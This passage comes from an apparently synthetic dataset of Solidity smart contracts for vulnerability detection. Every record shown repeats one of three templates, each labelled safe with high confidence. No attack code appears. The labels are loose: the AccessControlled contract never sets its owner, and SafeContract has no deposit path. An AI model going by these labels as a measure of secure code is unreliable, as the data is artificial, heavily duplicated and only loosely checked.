  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 92",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 93",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 94",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 95",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 96",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 97",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 98",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 99",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 100",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 101",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 102",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 103",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 104",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 105",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 106",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 107",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 108",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 109",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 110",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 111",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 112",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 113",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 114",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 115",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 116",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 117",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 118",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 119",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 120",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 121",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
